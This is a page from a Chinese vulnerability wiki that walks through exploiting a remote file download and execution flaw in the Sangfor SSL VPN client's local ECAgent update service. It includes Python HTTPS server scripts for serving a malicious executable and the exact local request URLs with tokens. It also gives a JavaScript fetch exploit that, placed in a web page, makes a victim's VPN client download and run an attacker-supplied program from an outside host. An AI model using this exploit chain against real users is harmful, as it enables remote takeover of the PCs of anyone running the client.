<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9C%AA%E5%88%86%E7%B1%BB/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SSL%20VPN%20%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>深信服 SSL VPN 客户端远程文件下载 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u6df1\u4fe1\u670d SSL VPN \u5ba2\u6237\u7aef\u8fdc\u7a0b\u6587\u4ef6\u4e0b\u8f7d", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        深信服 应用交付报表系统 download.php 任意文件读取漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SG%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20catjs.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SG%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20catjs.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        深信服 SG上网优化管理系统 catjs.php 任意文件读取漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="ssl-vpn">深信服 SSL VPN 客户端远程文件下载<a class="headerlink" href="#ssl-vpn" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>深信服 SSL VPN 客户端存在远程文件下载，且文件可控下载后可执行</p>
<p>参考阅读：</p>
<ul>
<li><a href="https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg">https://mp.weixin.qq.com/s/XbsxziIFKx8VhGd-pv0Ghg</a></li>
</ul>
<h2 id="_2">漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>深信服 SSL VPN
</code></pre></div>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>百度"intitle: 欢迎使用SSL VPN"，随便找一个地方下载VPN客户端下载安装：</p>
<p><img alt="" src="../images/202202091917573.png" /></p>
<p>安装完之后访问VPN的页面，发现VPN会自动下载组件更新：</p>
<p><img alt="" src="../images/202202091917218.png" /></p>
<p>这些请求均为GET请求并附带着一些参数，我们把它一一列下来：</p>
<p><img alt="" src="../images/202202091917102.png" /></p>
<p>本地来看一下这个<code>54530</code>端口对应的进程是什么：</p>
<p><img alt="" src="../images/202202091917296.png" /></p>
<p>发现这个端口是ECAgent.exe开启的，寻找到对应进程文件所在位置：</p>
<p><img alt="" src="../images/202202091917851.png" /></p>
<p>确认这是XXX SSLVPN的程序，那么就可以将两者联系到一起，访问VPN登录首页会触发对<code>127.0.0.1</code>的访问从而引起VPN进行组件更新。</p>
<p>通过以上的分析我们猜测了整个大致流程，但我们设想一下如果我们可以控制本地的更新指向我们的服务器，然后将更新的组件内容替换成恶意程序，当程序启动的时候就启动了恶意程序，这样我们可以拿到安装VPN客户端的使用者PC权限。</p>
<p>再回到之前的本地链接列表，根据对英文的理解，参数op的值应该为其具体对应要执行的动作：</p>
<div class="highlight"><pre><span></span><code>InitECAgent -&gt; 初始化
GetEncryptKey -&gt; 获取加密密钥
DoConfigure -&gt; 配置
CheckReLogin -&gt; 检查重新登录
CheckProxySetting -&gt; 检查代理设置
UpdateControls -&gt; 更新控制
DoQueryService -&gt; 查询服务
</code></pre></div>
<p>第一个初始化的请求存在可控参数arg1：</p>
<div class="highlight"><pre><span></span><code>https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=vpn.xxx.edu.cn%20443&amp;callback=EA_cb10000
</code></pre></div>
<p>参数<code>arg1=vpn.xxx.edu.cn%20443</code>，对应值也就是HOST+空格+端口的格式，看到这里基本上就会有一个思路，客户端更新控件是不是根据这个指定值向其发送请求更新的呢？我们可以只替换第一个初始化请求的arg1参数为<code>172.20.10.2 8000</code>，然后本地搭建一个HTTP服务：</p>
<div class="highlight"><pre><span></span><code>python -m SimpleHTTPServer
</code></pre></div>
<p>其他的请求原封不动，依次请求一遍那一份URL</p>
<p>服务端成功收到请求，但是却出现了错误的提示：</p>
<p><img alt="" src="../images/202202091917373.png" /></p>
<p>首先我们已经验证了自己的猜想，更新地址是自己可控的，客户端确实会向我们指定的服务端发送请求，但由于出现了错误我们不知道客户端访问了哪个文件，也不知道访问文件之后做了什么动作。</p>
<p>现在要做的就是搭建一个客户端可以正常访问的请求，通过这个错误大致可以知道，我搭建的服务端协议和客户端请求使用的协议不一致，本机抓个包发现客户端请求的是 HTTPS 协议，这就需要搭建一个 HTTPS 服务了。</p>
<p>如下脚本基于Python库建立一个 HTTPS 服务：</p>
<div class="highlight"><pre><span></span><code><span class="c1"># openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">BaseHTTPServer</span><span class="o">,</span><span class="w"> </span><span class="nn">SimpleHTTPServer</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>

<span class="n">httpd</span> <span class="o">=</span> <span class="n">BaseHTTPServer</span><span class="o">.</span><span class="n">HTTPServer</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">),</span> <span class="n">SimpleHTTPServer</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">)</span>
<span class="n">httpd</span><span class="o">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">wrap_socket</span> <span class="p">(</span><span class="n">httpd</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="s1">&#39;./server.pem&#39;</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div>
<p>搭建起一个 HTTPS 环境后再次复现如上请求，服务端收到日志：</p>
<p><img alt="" src="../images/202202091918528.png" /></p>
<p>可以看见客户端会访问两个文件：</p>
<div class="highlight"><pre><span></span><code>/com/WindowsModule.xml
/com/win/XXXUD.exe
</code></pre></div>
<p>先不管xml文件是怎么样的，可执行文件(exe)是需要重视的，但是这里通过提示可以看出客户端发出的请求是POST请求，但我们所写的Python脚本建立的HTTPS服务并不支持POST方法，我们需要重写一下Handler：</p>
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">BaseHTTPServer</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">SimpleHTTPServer</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">cgi</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">ssl</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ServerHandler</span><span class="p">(</span><span class="n">SimpleHTTPServer</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="p">):</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">form</span> <span class="o">=</span> <span class="n">cgi</span><span class="o">.</span><span class="n">FieldStorage</span><span class="p">()</span>
        <span class="n">SimpleHTTPServer</span><span class="o">.</span><span class="n">SimpleHTTPRequestHandler</span><span class="o">.</span><span class="n">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">)</span>

<span class="n">Handler</span> <span class="o">=</span> <span class="n">ServerHandler</span>

<span class="n">httpd</span> <span class="o">=</span> <span class="n">BaseHTTPServer</span><span class="o">.</span><span class="n">HTTPServer</span><span class="p">((</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">8000</span><span class="p">),</span> <span class="n">Handler</span><span class="p">)</span>
<span class="n">httpd</span><span class="o">.</span><span class="n">socket</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">wrap_socket</span> <span class="p">(</span><span class="n">httpd</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">certfile</span><span class="o">=</span><span class="s1">&#39;./server.pem&#39;</span><span class="p">,</span> <span class="n">server_side</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
<span class="n">httpd</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</code></pre></div>
<p>最终如上脚本支持<code>POST</code>方法，当时用<code>POST</code>方法请求时即返回文件内容。</p>
<p>最后，拖一个<code>calc.exe</code>（计算器）到HTTPS网站根目录下的<code>/com/win/XXXUD.exe</code>。</p>
<p>依次请求（<strong>经过多次复现发现，这三个请求才是重点的，其他的可以忽略</strong>）：</p>
<div class="highlight"><pre><span></span><code>https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=172.20.10.2 8000&amp;callback=EA_cb10000

https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3408a894633162c62188f98e92a221967dccfa5aafbd79b576714b4d1c392a4ad4b220d698efcd939c3b1b37467023e9380ee3abf0e492ee2efc736de757b80e973fe4c7d8af1af211a3f7ff3433cd9de975c76583efe7251dd1c0656f4384832998630359b65beb131cd8d287712462fa1b9e9acbc96dcc678b84cd57178c1a&amp;token=50065256e83ff1bb9e01757d0d22b669&amp;callback=EA_cb10003

https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;callback=EA_cb10005
</code></pre></div>
<p>会发现客户端请求之后，将文件下载到本地并启动该程序，成功弹出计算器：</p>
<p><img alt="" src="../images/202202091918246.png" /></p>
<p>Exploit很简单，当用户打开某个页面时访问那三个本地请求即可，这里使用JavaScript的fetch去实现即可：</p>
<div class="highlight"><pre><span></span><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="w">    </span><span class="c1">// 服务器IP和端口</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;172.20.10.2&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;4443&quot;</span><span class="p">;</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">poc_list</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;https://127.0.0.1:54530/ECAgent/?op=InitECAgent&amp;arg1=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot; &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;&amp;Guid=&amp;callback=EA_cb10000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;https://127.0.0.1:54530/ECAgent/?op=CheckReLogin&amp;arg1=3616f5b2ad1fe9b62b3d34509daa11259782919108eb2bebe59d64c808c3a079c6f6ae36b6ff1d63cb8067d08a9db72b70d912bfdb8bdc6ca18140cfa0ffb9e88b85acebf4bf544f71ff0fc662b9b95a8e939928b847018c106e1a96686e1ec3274a89ae0b8f77fc3d53a5ce0f1eec9a0ce8a5e4e2c927331cd94a67d5360a3e&amp;token=c4202416e283e60809d3b1e04e4bae6b&amp;Guid=&amp;callback=EA_cb10003&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;https://127.0.0.1:54530/ECAgent/?op=UpdateControls&amp;arg1=BEFORELOGIN&amp;Guid=&amp;callback=EA_cb10005&quot;</span><span class="p">];</span>
<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="kd">var</span><span class="w"> </span><span class="nx">i</span><span class="o">=</span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">&lt;</span><span class="nx">poc_list</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">){</span>
<span class="w">        </span><span class="nx">setTimeout</span><span class="p">(</span><span class="nx">fetch</span><span class="p">(</span><span class="nx">poc_list</span><span class="p">[</span><span class="nx">i</span><span class="p">]),</span><span class="s2">&quot;2000&quot;</span><span class="p">);</span>

<span class="w">    </span><span class="p">}</span>
<span class="o">&lt;</span><span class="err">/script&gt;</span>
</code></pre></div>
<p>其次就是需要一个HTTPS服务端的Python脚本，并且在脚本根目录下的<code>/com/win/</code>目录下有一个<code>XXXUD.exe</code>文件。</p>
<p><img alt="" src="../images/202202091918424.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E5%BA%94%E7%94%A8%E4%BA%A4%E4%BB%98%E6%8A%A5%E8%A1%A8%E7%B3%BB%E7%BB%9F%20download.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        深信服 应用交付报表系统 download.php 任意文件读取漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SG%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20catjs.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E6%B7%B1%E4%BF%A1%E6%9C%8D%20SG%E4%B8%8A%E7%BD%91%E4%BC%98%E5%8C%96%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20catjs.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        深信服 SG上网优化管理系统 catjs.php 任意文件读取漏洞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>